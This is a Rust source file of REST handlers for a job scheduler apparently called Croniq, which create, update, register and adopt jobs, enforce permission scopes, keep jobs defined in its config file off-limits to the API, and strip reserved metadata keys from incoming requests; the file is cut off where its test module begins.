//! Jobs CRUD endpoints.
//!
//! DSL-defined jobs (from the Croniqfile) live in `state.dsl_jobs`, not in the
//! persistent store. Read endpoints union the two sources; mutation endpoints
//! refuse to touch DSL-managed entries (the Croniqfile owns them and would
//! just recreate them on reload).

use std::collections::HashSet;
use std::sync::Arc;

use axum::{
    Extension, Json,
    extract::State,
    http::StatusCode,
    response::{IntoResponse, Response},
};
use chrono::Utc;
use croniq_auth::CallerContext;
use croniq_auth::context::Scope;
use croniq_config::compile::ExecutionMode;
use croniq_store::models::{DslAdoption, JobDefinition, JobStatus, TriggerDefinition};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

use super::ServerState;
use crate::api::auth_middleware::require_scope;
use crate::loader::{job_config_from_definition, synth_job_def_from_dsl, trigger_from_definition};
use crate::scheduler::SchedulerCommand;

/// Error type for job-mutation handlers. Carries a reason string for
/// `409 Conflict` (DSL-managed jobs) so the body explains *why* the request
/// was refused — clients see the same wording the MCP `update_job` tool uses.
/// `From<StatusCode>` makes `?` keep working for plain status returns from
/// existing helpers like [`require_scope`].
pub enum JobError {
    Status(StatusCode),
    DslManaged { job_key: String },
}

impl From<StatusCode> for JobError {
    fn from(s: StatusCode) -> Self {
        Self::Status(s)
    }
}

impl IntoResponse for JobError {
    fn into_response(self) -> Response {
        match self {
            Self::Status(s) => s.into_response(),
            Self::DslManaged { job_key } => (
                StatusCode::CONFLICT,
                Json(serde_json::json!({
                    "error": "dsl_managed",
                    "message": format!(
                        "Job '{job_key}' is managed by the Croniqfile. Edit the file and reload, or call POST /v1/jobs/{job_key}/adopt to take ownership (requires `policy {{ dsl_adopt_on_mutate true }}`)."
                    ),
                })),
            )
                .into_response(),
        }
    }
}

#[derive(Deserialize)]
pub struct CreateJobRequest {
    pub job_key: String,
    pub description: Option<String>,
    pub assigned_runner_id: Option<String>,
    #[serde(default)]
    pub metadata: std::collections::HashMap<String, String>,
    pub timeout: Option<String>,
    pub max_retries: Option<u32>,
    pub dead_letter_enabled: Option<bool>,
    /// Dead-letter retention duration ("14d"); None → system default (30d).
    pub dead_letter_retention: Option<String>,
    /// Triage hint surfaced with this job's dead letters.
    pub dead_letter_operator_hint: Option<String>,
    /// Opt-in stale-replay guard ("7d"); None → replays always allowed.
    pub dead_letter_replay_max_age: Option<String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

/// Check whether `job_key` is DSL-managed. Returns `true` if the Croniqfile
/// owns it; mutations must be refused.
async fn is_dsl_managed(state: &ServerState, job_key: &str) -> bool {
    let Some(dsl) = state.dsl_jobs.as_ref() else {
        return false;
    };
    dsl.read().await.iter().any(|j| j.key == job_key)
}

/// `GET /v1/jobs`
pub async fn handle_list(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
) -> Result<Json<Vec<JobDefinition>>, StatusCode> {
    require_scope(&ctx, Scope::JOBS_READ)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;
    let mut jobs = store
        .list_job_definitions()
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if let Some(dsl) = state.dsl_jobs.as_ref() {
        let guard = dsl.read().await;
        let seen: HashSet<String> = jobs.iter().map(|j| j.job_key.clone()).collect();
        let now = Utc::now();
        for cfg in guard.iter() {
            if !seen.contains(&cfg.key) {
                jobs.push(synth_job_def_from_dsl(cfg, now));
            }
        }
    }

    Ok(Json(jobs))
}

/// Per-job scheduling-liveness view (issue #250), derived from the
/// persisted `job_states` the scheduler advances on every fire. Surfaces
/// the `overdue` flag the dashboard renders distinctly from success-rate so
/// a silently-stalled scheduler doesn't read as healthy.
#[derive(Serialize)]
pub struct JobScheduleState {
    pub job_key: String,
    /// Lowercase trigger status: `active` / `paused` / `disabled` / `exhausted`.
    pub status: JobStatus,
    pub next_fire_at: Option<chrono::DateTime<Utc>>,
    pub last_fired_at: Option<chrono::DateTime<Utc>>,
    pub fire_count: u64,
    /// `true` when the trigger is active but its next scheduled fire is in
    /// the past — the scheduler hasn't advanced it, i.e. a missed fire.
    pub overdue: bool,
    /// Execution mode of the job: `queued` (persisted executions) or
    /// `ephemeral` (fire-and-forget, no execution rows). Surfaced so the
    /// dashboard can explain why an `ephemeral` job legitimately shows no
    /// execution history — otherwise indistinguishable from a broken job
    /// (issue #263). Defaults to `queued` for store-managed jobs.
    pub execution_mode: ExecutionMode,
    /// Set when the job is `paused` because its `calendar` reference did not
    /// resolve at load time (issue #361) — the calendar failed to compile or
    /// is not defined. Distinguishes a fail-closed pause from a manual one so
    /// the UI can badge it as a config error. `None` for healthy jobs.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub config_error: Option<String>,
    /// Set when the job is `active`, not overdue, and the current instant is
    /// outside its calendar/window gate (issue #391): the scheduler is
    /// intentionally idle until `next_fire_at`. Names the blocking gate,
    /// e.g. `calendar 'business-hours'`, so the UI can render a neutral
    /// "waiting" state instead of an alarming one. Absent when the gate is
    /// open, the job has no gate, or the live trigger snapshot is
    /// unavailable (store-only mode; jobs registered after boot).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub suppressed_by: Option<String>,
}

/// `GET /v1/jobs/states` — per-job scheduling liveness from `job_states`.
///
/// Sibling static route to `/v1/jobs/{job_key}` (like `/v1/jobs/register`);
/// matchit routes the static segment first. The UI polls this to badge
/// overdue jobs without re-deriving fire times from the forecast (which only
/// carries *future* fires and so can never show an overdue job).
pub async fn handle_list_states(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
) -> Result<Json<Vec<JobScheduleState>>, StatusCode> {
    require_scope(&ctx, Scope::JOBS_READ)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;
    let now = Utc::now();
    let states = store
        .list_job_states()
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    // Execution mode lives in the compiled DSL config, not in `job_states`.
    // Build a key → mode lookup so each state row can carry it; store-managed
    // jobs (no DSL entry) fall back to the default `queued`.
    let exec_modes: std::collections::HashMap<String, ExecutionMode> =
        if let Some(dsl) = state.dsl_jobs.as_ref() {
            dsl.read()
                .await
                .iter()
                .map(|cfg| (cfg.key.clone(), cfg.execution_mode))
                .collect()
        } else {
            std::collections::HashMap::new()
        };

    // Gate state comes from the live trigger snapshot the scheduler shares
    // for the forecast. Collected before the config_faults guard below — a
    // std RwLock must not be held across an await. An absent map (store-only
    // mode) or a job missing from it (registered after boot, refreshed on
    // reload) degrades to "no gate info": `suppressed_by` stays None.
    let suppressed: std::collections::HashMap<String, String> = match state.triggers.as_ref() {
        Some(triggers) => triggers
            .read()
            .await
            .iter()
            .filter_map(|(key, trigger)| trigger.gate_closed_reason(now).map(|r| (key.clone(), r)))
            .collect(),
        None => std::collections::HashMap::new(),
    };

    let faults = state.config_faults.read().unwrap();
    let out = states
        .into_iter()
        .map(|s| {
            let overdue =
                s.status == JobStatus::Active && s.next_fire_at.map(|t| t < now).unwrap_or(false);
            let execution_mode = exec_modes.get(&s.job_key).copied().unwrap_or_default();
            let config_error = faults.get(&s.job_key).cloned();
            // Only an active, non-overdue job is "waiting on its gate";
            // `overdue` keeps priority so a genuinely stalled scheduler
            // still reads as stalled (#250).
            let suppressed_by = if s.status == JobStatus::Active && !overdue {
                suppressed.get(&s.job_key).cloned()
            } else {
                None
            };
            JobScheduleState {
                job_key: s.job_key,
                status: s.status,
                next_fire_at: s.next_fire_at,
                last_fired_at: s.last_fired_at,
                fire_count: s.fire_count,
                overdue,
                execution_mode,
                config_error,
                suppressed_by,
            }
        })
        .collect();
    drop(faults);
    Ok(Json(out))
}

/// `GET /v1/jobs/{job_key}`
pub async fn handle_get(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    axum::extract::Path(job_key): axum::extract::Path<String>,
) -> Result<Json<JobDefinition>, StatusCode> {
    require_scope(&ctx, Scope::JOBS_READ)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;
    if let Some(job) = store
        .get_job_definition(&job_key)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
    {
        return Ok(Json(job));
    }

    if let Some(dsl) = state.dsl_jobs.as_ref() {
        let guard = dsl.read().await;
        if let Some(cfg) = guard.iter().find(|j| j.key == job_key) {
            return Ok(Json(synth_job_def_from_dsl(cfg, Utc::now())));
        }
    }

    Err(StatusCode::NOT_FOUND)
}

/// `POST /v1/jobs`
pub async fn handle_create(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    Json(req): Json<CreateJobRequest>,
) -> Result<(StatusCode, Json<JobDefinition>), JobError> {
    require_scope(&ctx, Scope::JOBS_WRITE)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;

    if is_dsl_managed(&state, &req.job_key).await {
        return Err(JobError::DslManaged {
            job_key: req.job_key,
        });
    }

    let now = Utc::now();
    // Normalize tags: trim, drop empties, dedupe while preserving order.
    // Mirrors the PUT /v1/jobs/{key} handler so a round-trip create-then-update
    // can't introduce subtle "env=prod" vs " env=prod" duplicates.
    let mut tags: Vec<String> = Vec::new();
    for t in req.tags {
        let trimmed = t.trim();
        if !trimmed.is_empty() && !tags.iter().any(|x| x == trimmed) {
            tags.push(trimmed.to_string());
        }
    }
    // Strip caller metadata in the reserved `__` namespace before it is
    // persisted. Stored job metadata is not handed to the scheduler today
    // (`job_config_from_definition` drops it), but `job_config_from_job_def`
    // does preserve it — so a stored `__runner_exec` / `__require` /
    // `__max_concurrent` would turn into runner-executed input the moment
    // those metadata are wired through. Filter at the ingress, like
    // `POST /v1/trigger` does, so the namespace stays scheduler-owned
    // regardless of what a later loader change does with the column.
    let mut metadata = req.metadata;
    let dropped = croniq_config::compile::strip_reserved_metadata_map(&mut metadata);
    for key in &dropped {
        tracing::debug!(
            job_key = %req.job_key,
            key = %key,
            "create job: ignoring caller metadata key in reserved `__` namespace"
        );
    }

    let job = JobDefinition {
        job_key: req.job_key,
        description: req.description,
        assigned_runner_id: req.assigned_runner_id,
        is_active: true,
        metadata,
        created_at: now,
        updated_at: now,
        timeout: req.timeout,
        max_retries: req.max_retries,
        dead_letter_enabled: req.dead_letter_enabled,
        dead_letter_retention: req.dead_letter_retention,
        dead_letter_operator_hint: req.dead_letter_operator_hint,
        dead_letter_replay_max_age: req.dead_letter_replay_max_age,
        tags,
    };
    store
        .create_job_definition(&job)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok((StatusCode::CREATED, Json(job)))
}

/// `PUT /v1/jobs/{job_key}` — update mutable metadata (description, timeout,
/// retry/dead-letter policy). Identity (`job_key`) and lifecycle
/// (`is_active`) stay on their dedicated endpoints. Schedules are owned by
/// `/v1/schedules`.
///
/// Each field is optional; omitting one leaves the stored value untouched.
/// To clear a field, send `null` explicitly (serde maps that to `None` and
/// the column is overwritten with NULL).
pub async fn handle_update(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    axum::extract::Path(job_key): axum::extract::Path<String>,
    Json(req): Json<serde_json::Value>,
) -> Result<Json<JobDefinition>, JobError> {
    require_scope(&ctx, Scope::JOBS_WRITE)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;

    if is_dsl_managed(&state, &job_key).await {
        return Err(JobError::DslManaged { job_key });
    }

    let mut job = store
        .get_job_definition(&job_key)
        .map_err(|_| JobError::from(StatusCode::INTERNAL_SERVER_ERROR))?
        .ok_or(JobError::from(StatusCode::NOT_FOUND))?;

    // Patch semantics: a missing key leaves the field as-is, an explicit
    // `null` clears it. We work directly on the JSON so we can tell those
    // apart — a typed struct can't.
    let obj = req
        .as_object()
        .ok_or(JobError::from(StatusCode::BAD_REQUEST))?;
    if let Some(v) = obj.get("description") {
        job.description = v.as_str().map(|s| s.to_string());
    }
    if let Some(v) = obj.get("timeout") {
        job.timeout = v.as_str().map(|s| s.to_string());
    }
    if let Some(v) = obj.get("max_retries") {
        job.max_retries = v.as_u64().map(|n| n as u32);
    }
    if let Some(v) = obj.get("dead_letter_enabled") {
        job.dead_letter_enabled = v.as_bool();
    }
    if let Some(v) = obj.get("dead_letter_retention") {
        job.dead_letter_retention = v.as_str().map(|s| s.to_string());
    }
    if let Some(v) = obj.get("dead_letter_operator_hint") {
        job.dead_letter_operator_hint = v.as_str().map(|s| s.to_string());
    }
    if let Some(v) = obj.get("dead_letter_replay_max_age") {
        job.dead_letter_replay_max_age = v.as_str().map(|s| s.to_string());
    }
    // Note: `metadata` is deliberately not patchable here — the reserved `__`
    // namespace is scheduler-owned (see `handle_create`). If metadata patching
    // is ever added, it must run `strip_reserved_metadata_map` first.
    if let Some(v) = obj.get("tags") {
        let mut out: Vec<String> = Vec::new();
        if let Some(arr) = v.as_array() {
            for item in arr {
                if let Some(s) = item.as_str() {
                    let trimmed = s.trim();
                    if !trimmed.is_empty() && !out.iter().any(|x| x == trimmed) {
                        out.push(trimmed.to_string());
                    }
                }
            }
        }
        job.tags = out;
    }
    job.updated_at = Utc::now();

    store
        .create_job_definition(&job)
        .map_err(|_| JobError::from(StatusCode::INTERNAL_SERVER_ERROR))?;
    Ok(Json(job))
}

/// `DELETE /v1/jobs/{job_key}`
pub async fn handle_delete(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    axum::extract::Path(job_key): axum::extract::Path<String>,
) -> Result<StatusCode, JobError> {
    require_scope(&ctx, Scope::JOBS_WRITE)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;

    if is_dsl_managed(&state, &job_key).await {
        return Err(JobError::DslManaged { job_key });
    }

    store
        .delete_job_definition(&job_key)
        .map(|_| StatusCode::NO_CONTENT)
        .map_err(|_| JobError::from(StatusCode::INTERNAL_SERVER_ERROR))
}

/// `POST /v1/jobs/{job_key}/activate`
pub async fn handle_activate(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    axum::extract::Path(job_key): axum::extract::Path<String>,
) -> Result<Json<JobDefinition>, JobError> {
    require_scope(&ctx, Scope::JOBS_WRITE)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;

    if is_dsl_managed(&state, &job_key).await {
        return Err(JobError::DslManaged { job_key });
    }

    let mut job = store
        .get_job_definition(&job_key)
        .map_err(|_| JobError::from(StatusCode::INTERNAL_SERVER_ERROR))?
        .ok_or(JobError::from(StatusCode::NOT_FOUND))?;
    job.is_active = true;
    job.updated_at = Utc::now();
    store
        .create_job_definition(&job)
        .map_err(|_| JobError::from(StatusCode::INTERNAL_SERVER_ERROR))?;
    Ok(Json(job))
}

/// `POST /v1/jobs/{job_key}/deactivate`
pub async fn handle_deactivate(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    axum::extract::Path(job_key): axum::extract::Path<String>,
) -> Result<Json<JobDefinition>, JobError> {
    require_scope(&ctx, Scope::JOBS_WRITE)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;

    if is_dsl_managed(&state, &job_key).await {
        return Err(JobError::DslManaged { job_key });
    }

    let mut job = store
        .get_job_definition(&job_key)
        .map_err(|_| JobError::from(StatusCode::INTERNAL_SERVER_ERROR))?
        .ok_or(JobError::from(StatusCode::NOT_FOUND))?;
    job.is_active = false;
    job.updated_at = Utc::now();
    store
        .create_job_definition(&job)
        .map_err(|_| JobError::from(StatusCode::INTERNAL_SERVER_ERROR))?;
    Ok(Json(job))
}

// ─── Job Registration (Runner/API self-service) ──────────────────────────────

#[derive(Deserialize)]
pub struct RegisterJobRequest {
    pub job_key: String,
    /// Schedule expression (interval shorthand: "5m", "1h", "300", or "*/5 * * * *")
    pub schedule: String,
    pub timezone: Option<String>,
    pub timeout: Option<String>,
    pub runner_id: Option<String>,
    #[serde(default)]
    pub capabilities: Vec<String>,
    pub description: Option<String>,
    pub max_retries: Option<u32>,
    pub dead_letter_enabled: Option<bool>,
    /// Dead-letter retention duration ("14d"); None → system default (30d).
    pub dead_letter_retention: Option<String>,
    /// Triage hint surfaced with this job's dead letters.
    pub dead_letter_operator_hint: Option<String>,
    /// Opt-in stale-replay guard ("7d"); None → replays always allowed.
    pub dead_letter_replay_max_age: Option<String>,
    /// Optional calendar **name** that gates execution (matches a row in
    /// `calendar_definitions.name`). The runtime resolves this to a
    /// compiled calendar at scheduler attach time.
    pub calendar: Option<String>,
}

#[derive(Serialize)]
pub struct RegisterJobResponse {
    pub job_key: String,
    pub trigger_id: String,
    pub status: String,
}

/// `POST /v1/jobs/register` — register a job from a runner or API client.
///
/// Collision policy:
/// - DSL-managed (Croniqfile) → skip (Croniqfile has precedence)
/// - `managed_by: "runner"/"api"` exists → update
/// - Not found → create
pub async fn handle_register(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    Json(req): Json<RegisterJobRequest>,
) -> Result<(StatusCode, Json<RegisterJobResponse>), StatusCode> {
    require_scope(&ctx, Scope::JOBS_REGISTER)?;
    let store = state
        .store
        .as_ref()
        .ok_or(StatusCode::SERVICE_UNAVAILABLE)?;
    let now = Utc::now();

    // DSL precedence — check the in-memory Croniqfile map, not the store,
    // since DSL entries are not persisted.
    if is_dsl_managed(&state, &req.job_key).await {
        return Ok((
            StatusCode::OK,
            Json(RegisterJobResponse {
                job_key: req.job_key.clone(),
                trigger_id: crate::loader::dsl_trigger_id(&req.job_key),
                status: "skipped_dsl_precedence".into(),
            }),
        ));
    }

    let existing_triggers = store
        .list_triggers(Some(&req.job_key))
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    // Create or update job definition. `RegisterJobRequest` carries no
    // metadata field on purpose: registration must not be able to seed the
    // reserved `__` namespace (see `handle_create`).
    let job_def = JobDefinition {
        job_key: req.job_key.clone(),
        description: req.description.clone(),
        assigned_runner_id: req.runner_id.clone(),
        is_active: true,
        metadata: std::collections::HashMap::new(),
        created_at: now,
        updated_at: now,
        timeout: req.timeout.clone(),
        max_retries: req.max_retries,
        dead_letter_enabled: req.dead_letter_enabled,
        dead_letter_retention: req.dead_letter_retention.clone(),
        dead_letter_operator_hint: req.dead_letter_operator_hint.clone(),
        dead_letter_replay_max_age: req.dead_letter_replay_max_age.clone(),
        tags: Vec::new(),
    };
    store
        .create_job_definition(&job_def)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    // Create or update trigger definition
    let trigger_id = existing_triggers
        .first()
        .map(|t| t.trigger_id.clone())
        .unwrap_or_else(|| Uuid::new_v4().to_string());

    let trigger_def = TriggerDefinition {
        trigger_id: trigger_id.clone(),
        job_key: req.job_key.clone(),
        cron_expression: Some(req.schedule.clone()),
        timezone: req.timezone.clone(),
        calendar: req.calendar.clone(),
        window: None,
        not_before: None,
        not_after: None,
        enabled: true,
        // "api" so the schedule is editable via PUT /v1/schedules — the
        // register endpoint is just an upsert convenience and the result
        // should look identical to a POST /v1/schedules row, not a
        // separate read-only kind.
        managed_by: "api".into(),
        created_at: now,
        updated_at: now,
    };
    store
        .create_trigger(&trigger_def)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    // Push to live scheduler. The calendar gate is resolved and attached
    // here (issue #393); an unresolvable reference fails closed (paused
    // trigger + config_error fault) under `strict_calendars`. Register stays
    // lenient (no 400): it's a runner-bootstrap upsert where the referenced
    // calendar may be created moments later — the fault surfaces the gap.
    let status = if let Some(ref tx) = state.scheduler_tx {
        let resolved = state.resolved_calendars().await;
        if let Some(built) = trigger_from_definition(&trigger_def, &resolved, now) {
            let job_config = job_config_from_definition(&trigger_def, Some(&job_def));
            let _ = tx.send(SchedulerCommand::AddJob {
                job: Box::new(job_config),
                trigger: Box::new(built.trigger),
            });
            let faulted = built.calendar_fault.is_some();
            state.set_config_fault(&trigger_def.job_key, built.calendar_fault);
            if faulted {
                "registered_calendar_fault"
            } else {
                "registered"
            }
        } else {
            "registered_no_schedule"
        }
    } else {
        "registered_no_scheduler"
    };

    let code = if existing_triggers.is_empty() {
        StatusCode::CREATED
    } else {
        StatusCode::OK
    };
    Ok((
        code,
        Json(RegisterJobResponse {
            job_key: req.job_key,
            trigger_id,
            status: status.into(),
        }),
    ))
}

// ─── Adoption ─────────────────────────────────────────────────────────────────

#[derive(Serialize)]
pub struct JobAdoptResponse {
    pub job: JobDefinition,
    pub trigger: TriggerDefinition,
    pub dsl_key: String,
}

/// `POST /v1/jobs/{job_key}/adopt` — copy a DSL-managed job (and its trigger)
/// into the API store with `managed_by="api"` and a fresh trigger UUID, then
/// record the adoption so the loader skips the DSL key on subsequent reloads.
///
/// Requires `policy { dsl_adopt_on_mutate true }` in the Croniqfile. Mirrors
/// [`crate::api::calendars::handle_adopt`] with the extra step of also
/// pushing the new trigger to the live scheduler so the job keeps firing
/// without waiting for a reload.
pub async fn handle_adopt(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    axum::extract::Path(job_key): axum::extract::Path<String>,
) -> Result<(StatusCode, Json<JobAdoptResponse>), (StatusCode, Json<serde_json::Value>)> {
    if !ctx.has_scope(Scope::JOBS_WRITE) {
        return Err((
            StatusCode::FORBIDDEN,
            Json(serde_json::json!({
                "error": "forbidden",
                "message": format!("missing scope: {}", Scope::JOBS_WRITE),
            })),
        ));
    }
    if !state
        .policy_dsl_adopt_on_mutate
        .load(std::sync::atomic::Ordering::Relaxed)
    {
        return Err((
            StatusCode::CONFLICT,
            Json(serde_json::json!({
                "error": "adoption_disabled",
                "message": "DSL adoption is disabled — set `policy { dsl_adopt_on_mutate true }` in the Croniqfile to enable",
            })),
        ));
    }

    let cfg = {
        let dsl = state.dsl_jobs.as_ref().ok_or((
            StatusCode::SERVICE_UNAVAILABLE,
            Json(serde_json::json!({"error": "no_dsl_state", "message": "DSL job state unavailable"})),
        ))?;
        let guard = dsl.read().await;
        match guard.iter().find(|j| j.key == job_key) {
            Some(c) => c.clone(),
            None => {
                return Err((
                    StatusCode::NOT_FOUND,
                    Json(serde_json::json!({
                        "error": "not_found",
                        "message": format!("DSL job '{job_key}' not found"),
                    })),
                ));
            }
        }
    };

    let store = state.store.as_ref().ok_or((
        StatusCode::SERVICE_UNAVAILABLE,
        Json(serde_json::json!({"error": "no_store", "message": "store unavailable"})),
    ))?;

    let now = Utc::now();
    let job_def = synth_job_def_from_dsl(&cfg, now);
    store.create_job_definition(&job_def).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(serde_json::json!({
                "error": "store_error",
                "message": format!("failed to persist adopted job: {e}"),
            })),
        )
    })?;

    // Trigger gets a real UUID and managed_by="api"; everything else mirrors
    // the synthetic trigger the loader builds from the same JobConfig.
    let trigger_def = TriggerDefinition {
        trigger_id: Uuid::new_v4().to_string(),
        job_key: cfg.key.clone(),
        // Canonical, re-parseable DSL line (see `synth_trigger_def_from_dsl`) —
        // `schedule_summary` doesn't round-trip for weekday/monthly schedules,
        // so an adopted non-interval job would vanish on the next reload.
        cron_expression: Some(cfg.schedule.to_dsl()),
        timezone: cfg.timezone.clone(),
        calendar: cfg.calendar.clone(),
        window: cfg.window.clone(),
        not_before: cfg.not_before.as_deref().and_then(|s| {
            chrono::DateTime::parse_from_rfc3339(s)
                .ok()
                .map(|d| d.with_timezone(&Utc))
        }),
        not_after: cfg.not_after.as_deref().and_then(|s| {
            chrono::DateTime::parse_from_rfc3339(s)
                .ok()
                .map(|d| d.with_timezone(&Utc))
        }),
        enabled: !matches!(
            cfg.schedule,
            croniq_config::schedule::CompiledSchedule::Disabled
        ),
        managed_by: "api".into(),
        created_at: now,
        updated_at: now,
    };
    store.create_trigger(&trigger_def).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(serde_json::json!({
                "error": "store_error",
                "message": format!("failed to persist adopted trigger: {e}"),
            })),
        )
    })?;

    store
        .insert_adoption(&DslAdoption {
            resource_type: "job".into(),
            resource_key: cfg.key.clone(),
            adopted_at: now,
            adopted_by: Some(ctx.caller_id.clone()),
        })
        .map_err(|e| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                Json(serde_json::json!({
                    "error": "store_error",
                    "message": format!("failed to record adoption: {e}"),
                })),
            )
        })?;

    // Drop the DSL entry from the in-memory snapshot so the API list stops
    // double-counting until the next reload re-emits a filtered set.
    if let Some(dsl) = state.dsl_jobs.as_ref() {
        let mut guard = dsl.write().await;
        guard.retain(|j| j.key != cfg.key);
    }

    // Push the freshly-API-managed trigger to the running scheduler so the
    // job keeps firing without waiting for a reload. The DSL trigger keyed
    // by the same job_key gets replaced inside the scheduler. Resolving the
    // calendar here restores the gate the job had as a DSL trigger — before
    // #393 adoption silently dropped it (the union resolver finds the
    // calendar whether it is still DSL-defined or was itself adopted).
    if let Some(ref tx) = state.scheduler_tx {
        let resolved = state.resolved_calendars().await;
        if let Some(built) = trigger_from_definition(&trigger_def, &resolved, now) {
            let job_config = job_config_from_definition(&trigger_def, Some(&job_def));
            let _ = tx.send(SchedulerCommand::AddJob {
                job: Box::new(job_config),
                trigger: Box::new(built.trigger),
            });
            state.set_config_fault(&trigger_def.job_key, built.calendar_fault);
        }
    }

    Ok((
        StatusCode::OK,
        Json(JobAdoptResponse {
            job: job_def,
            trigger: trigger_def,
            dsl_key: cfg.key,
        }),
    ))
}

/// `POST /v1/jobs/{job_key}/unadopt` — remove the API copy plus the
/// `dsl_adoptions` row so the next reload reinstates the DSL definition.
/// Looks up triggers by `job_key`; deletes any API-managed ones.
pub async fn handle_unadopt(
    State(state): State<Arc<ServerState>>,
    Extension(ctx): Extension<CallerContext>,
    axum::extract::Path(job_key): axum::extract::Path<String>,
) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
    if !ctx.has_scope(Scope::JOBS_WRITE) {
        return Err((
            StatusCode::FORBIDDEN,
            Json(serde_json::json!({
                "error": "forbidden",
                "message": format!("missing scope: {}", Scope::JOBS_WRITE),
            })),
        ));
    }
    let store = state.store.as_ref().ok_or((
        StatusCode::SERVICE_UNAVAILABLE,
        Json(serde_json::json!({"error": "no_store", "message": "store unavailable"})),
    ))?;

    let was_adopted = store.is_adopted("job", &job_key).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(serde_json::json!({
                "error": "store_error",
                "message": format!("adoption lookup failed: {e}"),
            })),
        )
    })?;
    if !was_adopted {
        return Err((
            StatusCode::CONFLICT,
            Json(serde_json::json!({
                "error": "not_adopted",
                "message": format!("job '{job_key}' was not adopted from DSL — use DELETE for API-only jobs"),
            })),
        ));
    }

    let _ = ctx;

    // Delete any API-managed triggers belonging to this job. There may be
    // more than one if the user added schedules after adoption — drop them
    // all so the DSL trigger gets a clean slate on next reload.
    let triggers = store.list_triggers(Some(&job_key)).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(serde_json::json!({
                "error": "store_error",
                "message": format!("failed to list triggers: {e}"),
            })),
        )
    })?;
    for t in &triggers {
        if t.managed_by == "api" {
            store.delete_trigger(&t.trigger_id).map_err(|e| {
                (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    Json(serde_json::json!({
                        "error": "store_error",
                        "message": format!("failed to delete trigger {}: {e}", t.trigger_id),
                    })),
                )
            })?;
        }
    }
    // Also drop the API job definition so the DSL one isn't shadowed.
    let _ = store.delete_job_definition(&job_key);

    store.delete_adoption("job", &job_key).map_err(|e| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(serde_json::json!({
                "error": "store_error",
                "message": format!("failed to clear adoption: {e}"),
            })),
        )
    })?;

    // Tell the live scheduler to drop the job now — the DSL trigger comes
    // back on next reload (file change or admin endpoint).
    if let Some(ref tx) = state.scheduler_tx {
        let _ = tx.send(SchedulerCommand::RemoveJob {
            job_key: job_key.clone(),
        });
    }

    Ok(StatusCode::NO_CONTENT)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::api::{ServerState, server_router};
    use crate::store::{DynStore, sqlite_store};
    use axum::body::Body;
    use axum::http::Request;
    use croniq_config::compile::JobConfig;
    use croniq_runner::AppState;
    use croniq_store::sqlite::SqliteStore;
    use http_body_util::BodyExt;
    use tokio::sync::{RwLock, mpsc};
    use tower::util::ServiceExt;

    fn make_store() -> DynStore {
        sqlite_store(SqliteStore::in_memory().unwrap())
    }

    fn dsl_job(key: &str) -> JobConfig {
        crate::loader::load_str(&format!("job {key} {{ every 5 minutes }}"))
            .unwrap()
            .runtime
            .jobs
            .pop()
            .unwrap()
    }

    fn make_state(dsl: Vec<JobConfig>, store: DynStore) -> Arc<ServerState> {
        let runner = AppState::new();
        let (tx, _rx) = mpsc::unbounded_channel();
        let mut state = ServerState::with_auth(runner, tx, None, Some(store));
        {
            let s = Arc::get_mut(&mut state).unwrap();
            s.dsl_jobs = Some(Arc::new(RwLock::new(dsl)));
        }
        state
    }

    async fn body_json(app: axum::Router, method: &str, uri: &str) -> (u16, serde_json::Value) {
        let resp = app
            .oneshot(
                Request::builder()
                    .method(method)
                    .uri(uri)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = resp.status().as_u16();
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        let json = serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null);
        (status, json)
    }

    async fn status_of(app: axum::Router, method: &str, uri: &str) -> u16 {
        app.oneshot(
            Request::builder()
                .method(method)
                .uri(uri)
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap()
        .status()
        .as_u16()
    }

    #[tokio::test]
    async fn list_jobs_unions_dsl_with_store() {
